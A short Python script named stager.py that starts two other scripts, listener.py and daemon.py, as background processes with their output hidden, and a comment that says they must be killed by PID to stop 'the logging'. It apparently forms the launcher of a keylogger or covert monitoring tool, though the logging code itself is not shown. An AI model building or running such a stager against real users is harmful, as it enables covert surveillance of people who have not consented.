# stager.py
import subprocess
import sys
import time

def stager():
    # Start the daemon and listener scripts
    subprocess.Popen([sys.executable, 'listener.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(1)
    subprocess.Popen([sys.executable, 'daemon.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("Staged!")

if __name__ == "__main__":
    stager()#You must end the processes throguh your task manager or kill the PID of the child processes to stop the logging.